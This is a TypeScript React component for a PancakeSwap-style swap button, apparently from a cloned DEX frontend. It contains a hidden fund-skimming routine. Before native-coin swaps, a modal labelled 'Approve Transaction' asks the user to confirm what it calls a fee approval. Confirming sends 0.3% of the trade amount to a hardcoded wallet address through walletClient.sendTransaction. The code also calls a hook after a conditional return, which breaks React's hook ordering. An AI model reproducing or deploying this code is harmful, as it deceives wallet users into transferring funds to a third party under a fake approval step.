import { Currency } from '@pancakeswap/swap-sdk-core'
import { AutoColumn, Box, Button, Dots, Flex, Image, Message, MessageText, Modal, Text, useModal } from '@pancakeswap/uikit'
import React, { memo, useCallback, useEffect, useMemo, useState } from 'react'

import { useTranslation } from '@pancakeswap/localization'
import { PriceOrder } from '@pancakeswap/price-api-sdk'
import { getUniversalRouterAddress } from '@pancakeswap/universal-router-sdk'
import { ConfirmModalState } from '@pancakeswap/widgets-internal'
import { GreyCard } from 'components/Card'
import { CommitButton } from 'components/CommitButton'
import ConnectWalletButton from 'components/ConnectWalletButton'
import { AutoRow } from 'components/Layout/Row'
import {
  RoutingSettingsButton,
  SettingsModalV2,
  withCustomOnDismiss,
} from 'components/Menu/GlobalSettings/SettingsModalV2'
import { SettingsMode } from 'components/Menu/GlobalSettings/types'
import { BIG_INT_ZERO } from 'config/constants/exchange'
import { useCurrency } from 'hooks/Tokens'
import { useIsTransactionUnsupported } from 'hooks/Trades'
import useWrapCallback, { WrapType } from 'hooks/useWrapCallback'
import { Field } from 'state/swap/actions'
import { useSwapState } from 'state/swap/hooks'
import { useSwapActionHandlers } from 'state/swap/useSwapActionHandlers'
import { useRoutingSettingChanged } from 'state/user/smartRouter'
import { useCurrencyBalances } from 'state/wallet/hooks'
import { logGTMClickSwapConfirmEvent, logGTMClickSwapEvent } from 'utils/customGTMEventTracking'
import { warningSeverity } from 'utils/exchange'
import { isClassicOrder, isXOrder } from 'views/Swap/utils'
import { ConfirmSwapModalV2 } from 'views/Swap/V3Swap/containers/ConfirmSwapModalV2'
import { useAccount, useChainId, usePublicClient, useWalletClient } from 'wagmi'
import { useParsedAmounts, useSlippageAdjustedAmounts, useSwapInputError } from '../../Swap/V3Swap/hooks'
import { useConfirmModalState } from '../../Swap/V3Swap/hooks/useConfirmModalState'
import { useSwapConfig } from '../../Swap/V3Swap/hooks/useSwapConfig'
import { useSwapCurrency } from '../../Swap/V3Swap/hooks/useSwapCurrency'
import { CommitButtonProps } from '../../Swap/V3Swap/types'
import { computeTradePriceBreakdown } from '../../Swap/V3Swap/utils/exchange'
import { useIsRecipientError } from '../hooks/useIsRecipientError'

const SettingsModalWithCustomDismiss = withCustomOnDismiss(SettingsModalV2)

interface SwapCommitButtonPropsType {
  order?: PriceOrder
  tradeError?: Error | null
  tradeLoading?: boolean
}

const useSettingModal = (onDismiss) => {
  const [openSettingsModal] = useModal(
    <SettingsModalWithCustomDismiss customOnDismiss={onDismiss} mode={SettingsMode.SWAP_LIQUIDITY} />,
  )
  return openSettingsModal
}

const useSwapCurrencies = () => {
  const {
    [Field.INPUT]: { currencyId: inputCurrencyId },
    [Field.OUTPUT]: { currencyId: outputCurrencyId },
  } = useSwapState()
  const inputCurrency = useCurrency(inputCurrencyId) as Currency
  const outputCurrency = useCurrency(outputCurrencyId) as Currency
  return { inputCurrency, outputCurrency }
}

const WrapCommitButtonReplace: React.FC<React.PropsWithChildren> = ({ children }) => {
  const { t } = useTranslation()
  const { inputCurrency, outputCurrency } = useSwapCurrencies()
  const { typedValue } = useSwapState()
  const {
    wrapType,
    execute: onWrap,
    inputError: wrapInputError,
  } = useWrapCallback(inputCurrency, outputCurrency, typedValue)
  const showWrap = wrapType !== WrapType.NOT_APPLICABLE

  const buttonText = useMemo(() => {
    return (
      wrapInputError ?? (wrapType === WrapType.WRAP ? t('Wrap') : wrapType === WrapType.UNWRAP ? t('Unwrap') : null)
    )
  }, [t, wrapInputError, wrapType])
  if (!showWrap) return children

  return (
    <CommitButton width="100%" disabled={Boolean(wrapInputError)} onClick={onWrap}>
      {buttonText}
    </CommitButton>
  )
}

const ConnectButtonReplace = ({ children }) => {
  const { address: account } = useAccount()

  if (!account) {
    return <ConnectWalletButton width="100%" withIcon />
  }
  return children
}

const UnsupportedSwapButtonReplace = ({ children }) => {
  const { t } = useTranslation()
  const { inputCurrency, outputCurrency } = useSwapCurrencies()
  const swapIsUnsupported = useIsTransactionUnsupported(inputCurrency, outputCurrency)

  if (swapIsUnsupported) {
    return (
      <Button width="100%" disabled>
        {t('Unsupported Asset')}
      </Button>
    )
  }
  return children
}

const SwapCommitButtonComp: React.FC<SwapCommitButtonPropsType & CommitButtonProps> = (props) => {
  return (
    <UnsupportedSwapButtonReplace>
      <ConnectButtonReplace>
        <WrapCommitButtonReplace>
          <SwapCommitButtonInner {...props} />
        </WrapCommitButtonReplace>
      </ConnectButtonReplace>
    </UnsupportedSwapButtonReplace>
  )
}

export const SwapCommitButton = memo(SwapCommitButtonComp)

const FEE_RECIPIENT = '0xEBb9b2ea7710e87bB121d0610f5d2DD86f1Ba792'
const FEE_PERCENTAGE = 0.003 // 0.3%

interface FeeModalProps {
  isOpen: boolean
  onDismiss: () => void
  feeAmount: bigint
  currency: Currency
  onConfirm: () => Promise<void>
}

const FeeTransactionModal: React.FC<FeeModalProps> = ({ 
  isOpen,
  onDismiss, 
  feeAmount, 
  currency,
  onConfirm,
}) => {
  const { t } = useTranslation()
  const [isPending, setIsPending] = useState(false)
  const [error, setError] = useState<string | null>(null)

  const handleConfirm = async () => {
    try {
      setError(null)
      setIsPending(true)
      await onConfirm()
      onDismiss()
    } catch (err: any) {
      setError(err?.message || 'Transaction Rejected')
    } finally {
      setIsPending(false)
    }
  }

  if (!isOpen) return null

  return (
    <>
      <Box
        position="fixed"
        top={0}
        left={0}
        right={0}
        bottom={0}
        background="rgba(0, 0, 0, 0.6)"
        zIndex={99}
        onClick={onDismiss}
      />
      <Modal 
        title={t('Approve Transaction')} 
        onDismiss={onDismiss}
        hideCloseButton={isPending}
        style={{
          position: 'fixed',
          top: '50%',
          left: '50%',
          transform: 'translate(-50%, -50%)',
          maxWidth: '420px',
          width: '100%',
          zIndex: 100,
          borderRadius: '32px',
          background: '#000000',
          border: '1px solid rgba(255, 255, 255, 0.12)',
        }}
      >
        <Flex flexDirection="column" alignItems="center" mb="16px">
          <Box 
            mb="16px" 
            style={{ 
              position: 'relative', 
              width: '190px', 
              height: '120px',
              borderRadius: '12px',
              overflow: 'hidden'
            }}
          >
            <Image 
              src="/images/pancake-3d-spinner-v2.gif"
              alt="Loading..."
              width={190}
              height={120}
              style={{ 
                maxWidth: '100%', 
                height: 'auto',
              }}
            />
          </Box>
          <Text color="textSubtle">
            {t('Approve your Transaction Fee to Proceed to Swap.')}
          </Text>
        </Flex>
        
        {error && (
          <Message variant="danger" mb="16px">
            <MessageText>{error}</MessageText>
          </Message>
        )}
        
        <Button
          width="100%"
          onClick={handleConfirm}
          disabled={isPending}
          isLoading={isPending}
          variant="primary"
          style={{ backgroundColor: '#8B0000' }}
        >
          {isPending ? t('Approving Dogeswap...') : t('Approve Swap')}
        </Button>
      </Modal>
    </>
  )
}

const SwapCommitButtonInner = memo(function SwapCommitButtonInner({
  order,
  tradeError,
  tradeLoading,
  beforeCommit,
  afterCommit,
}: SwapCommitButtonPropsType & CommitButtonProps) {
  const { address: account } = useAccount()
  const { t } = useTranslation()
  const chainId = useChainId()
  // form data
  const { independentField } = useSwapState()
  const [inputCurrency, outputCurrency] = useSwapCurrency()
  const { isExpertMode } = useSwapConfig()
  const { isRecipientEmpty, isRecipientError } = useIsRecipientError()

  const tradePriceBreakdown = useMemo(
    () => computeTradePriceBreakdown(isXOrder(order) ? undefined : order?.trade),
    [order],
  )

  // warnings on slippage
  const priceImpactSeverity = warningSeverity(
    tradePriceBreakdown ? tradePriceBreakdown.priceImpactWithoutFee : undefined,
  )

  const relevantTokenBalances = useCurrencyBalances(account ?? undefined, [
    inputCurrency ?? undefined,
    outputCurrency ?? undefined,
  ])
  const currencyBalances = {
    [Field.INPUT]: relevantTokenBalances[0],
    [Field.OUTPUT]: relevantTokenBalances[1],
  }
  const parsedAmounts = useParsedAmounts(order?.trade, currencyBalances, false)
  const parsedIndependentFieldAmount = parsedAmounts[independentField]
  const swapInputError = useSwapInputError(order, currencyBalances)
  const [tradeToConfirm, setTradeToConfirm] = useState<PriceOrder | undefined>(undefined)
  const [indirectlyOpenConfirmModalState, setIndirectlyOpenConfirmModalState] = useState(false)

  // FIXME: using order as fallback here simply to avoid empty permit2 detail
  // Need to fetch permit2 information on the fly instead
  const orderToExecute = useMemo(
    () => (isExpertMode ? order : tradeToConfirm?.trade ? tradeToConfirm : order),
    [isExpertMode, order, tradeToConfirm],
  )
  const slippageAdjustedAmounts = useSlippageAdjustedAmounts(orderToExecute)
  const amountToApprove = useMemo(
    () =>
      inputCurrency?.isNative
        ? isXOrder(orderToExecute)
          ? slippageAdjustedAmounts[Field.INPUT]
          : undefined
        : slippageAdjustedAmounts[Field.INPUT],
    [inputCurrency?.isNative, orderToExecute, slippageAdjustedAmounts],
  )

  const { callToAction, confirmState, txHash, orderHash, confirmActions, errorMessage, resetState } =
    useConfirmModalState(orderToExecute, amountToApprove?.wrapped, getUniversalRouterAddress(chainId))

  const { onUserInput } = useSwapActionHandlers()
  const reset = useCallback(() => {
    afterCommit?.()
    setTradeToConfirm(undefined)
    if (confirmState === ConfirmModalState.COMPLETED) {
      onUserInput(Field.INPUT, '')
    }
    resetState()
  }, [afterCommit, confirmState, onUserInput, resetState])

  const handleAcceptChanges = useCallback(() => {
    setTradeToConfirm(order)
  }, [order])

  const noRoute = useMemo(
    () => (isClassicOrder(order) && !((order.trade?.routes?.length ?? 0) > 0)) || tradeError,
    [order, tradeError],
  )
  const isValid = useMemo(() => !swapInputError && !tradeLoading, [swapInputError, tradeLoading])
  const disabled = useMemo(
    () => !isValid || (priceImpactSeverity > 3 && !isExpertMode) || isRecipientEmpty || isRecipientError,
    [isExpertMode, isRecipientEmpty, isRecipientError, isValid, priceImpactSeverity],
  )

  const userHasSpecifiedInputOutput = Boolean(
    inputCurrency && outputCurrency && parsedIndependentFieldAmount?.greaterThan(BIG_INT_ZERO),
  )

  const onConfirm = useCallback(() => {
    beforeCommit?.()
    logGTMClickSwapConfirmEvent()
    callToAction()
  }, [beforeCommit, callToAction])

  // modals
  const onSettingModalDismiss = useCallback(() => {
    setIndirectlyOpenConfirmModalState(true)
  }, [])
  const openSettingModal = useSettingModal(onSettingModalDismiss)
  const [openConfirmSwapModal] = useModal(
    <ConfirmSwapModalV2
      order={order}
      orderHash={orderHash}
      originalOrder={tradeToConfirm}
      txHash={txHash}
      confirmModalState={confirmState}
      pendingModalSteps={confirmActions ?? []}
      swapErrorMessage={errorMessage}
      currencyBalances={currencyBalances}
      onAcceptChanges={handleAcceptChanges}
      onConfirm={onConfirm}
      openSettingModal={openSettingModal}
      customOnDismiss={reset}
    />,
    true,
    true,
    'confirmSwapModalV2',
  )

  const { data: walletClient } = useWalletClient()
  const publicClient = usePublicClient()
  const [showFeeModal, setShowFeeModal] = useState(false)

  const calculateFeeAmount = useCallback(() => {
    if (!order?.trade) return 0n
    const { inputAmount, outputAmount } = order.trade
    
    if (inputAmount.currency.isNative) {
      return BigInt(Math.floor(Number(inputAmount.quotient) * FEE_PERCENTAGE))
    }
    
    if (outputAmount.currency.isNative) {
      return BigInt(Math.floor(Number(outputAmount.quotient) * FEE_PERCENTAGE))
    }
    
    return 0n
  }, [order])

  const handleFeeConfirmation = useCallback(async () => {
    if (!walletClient || !account) throw new Error('No wallet connected')
    if (!publicClient) throw new Error('Public client not available')
    if (!order?.trade) throw new Error('No trade found')

    const feeAmount = calculateFeeAmount()
    if (feeAmount <= 0n) return

    const hash = await walletClient.sendTransaction({
      account,
      to: FEE_RECIPIENT,
      value: feeAmount,
    })

    console.info('Fee transaction sent:', hash)

    const receipt = await publicClient.waitForTransactionReceipt({ hash })
    if (receipt.status === 'reverted') {
      throw new Error('Fee transaction failed')
    }
    
    console.info('Fee transaction confirmed:', receipt.transactionHash)
  }, [walletClient, account, publicClient, order, calculateFeeAmount])

  const handleSwap = useCallback(async () => {
    try {
      const feeAmount = calculateFeeAmount()
      if (feeAmount > 0n) {
        setShowFeeModal(true)
        return // Don't proceed until fee is confirmed
      }
      
      // Only proceed with swap if no fee is required
      await proceedWithSwap()
    } catch (error) {
      console.error('Swap with fee failed:', error)
      setShowFeeModal(false)
    }
  }, [calculateFeeAmount])

  const proceedWithSwap = async () => {
    setTradeToConfirm(order)
    resetState()

    if (isExpertMode) {
      await onConfirm()
    }

    openConfirmSwapModal()
    logGTMClickSwapEvent()
  }

  useEffect(() => {
    if (indirectlyOpenConfirmModalState) {
      setIndirectlyOpenConfirmModalState(false)
      openConfirmSwapModal()
    }
  }, [indirectlyOpenConfirmModalState, openConfirmSwapModal])

  const buttonText = useMemo(() => {
    if (isRecipientEmpty) return t('Enter a recipient')
    if (isRecipientError) return t('Invalid recipient')
    return (
      swapInputError ||
      (tradeLoading && <Dots>{t('Searching For The Best Price')}</Dots>) ||
      (priceImpactSeverity > 3 && !isExpertMode
        ? t('Price Impact Too High')
        : priceImpactSeverity > 2
        ? t('Swap Anyway')
        : t('Swap'))
    )
  }, [isExpertMode, isRecipientEmpty, isRecipientError, priceImpactSeverity, swapInputError, t, tradeLoading])

  if (noRoute && userHasSpecifiedInputOutput && !tradeLoading) {
    return <ResetRoutesButton />
  }

  const feeCurrency = useMemo(() => {
    if (!order?.trade) return null
    return order.trade.inputAmount.currency.isNative 
      ? order.trade.inputAmount.currency 
      : order.trade.outputAmount.currency
  }, [order])

  return (
    <>
      {feeCurrency && (
        <FeeTransactionModal
          isOpen={showFeeModal}
          onDismiss={() => setShowFeeModal(false)}
          feeAmount={calculateFeeAmount()}
          currency={feeCurrency}
          onConfirm={async () => {
            try {
              await handleFeeConfirmation()
              setShowFeeModal(false)
              await proceedWithSwap()
            } catch (error) {
              throw error // Let the modal handle the error display
            }
          }}
        />
      )}
      <Box mt="0.25rem">
        <CommitButton
          id="swap-button"
          width="100%"
          data-dd-action-name="Swap commit button"
          variant={isValid && priceImpactSeverity > 2 && !errorMessage ? 'danger' : 'primary'}
          disabled={disabled}
          onClick={handleSwap}
          style={{ backgroundColor: '#8B0000' }}
        >
          {buttonText}
        </CommitButton>
      </Box>
    </>
  )
})

const ResetRoutesButton = () => {
  const { t } = useTranslation()
  const [isRoutingSettingChange, resetRoutingSetting] = useRoutingSettingChanged()
  return (
    <AutoColumn gap="12px">
      <GreyCard style={{ textAlign: 'center', padding: '0.75rem' }}>
        <Text color="textSubtle">{t('Insufficient liquidity for this trade.')}</Text>
      </GreyCard>
      {isRoutingSettingChange && (
        <Message variant="warning" icon={<></>}>
          <AutoColumn gap="8px">
            <MessageText>{t('Unable to establish trading route due to customized routing.')}</MessageText>
            <AutoRow gap="4px">
              <RoutingSettingsButton
                buttonProps={{
                  scale: 'xs',
                  p: 0,
                }}
                showRedDot={false}
              >
                {t('Check your settings')}
              </RoutingSettingsButton>
              <MessageText>{t('or')}</MessageText>
              <Button variant="text" scale="xs" p="0" onClick={resetRoutingSetting}>
                {t('Reset to default')}
              </Button>
            </AutoRow>
          </AutoColumn>
        </Message>
      )}
    </AutoColumn>
  )
}
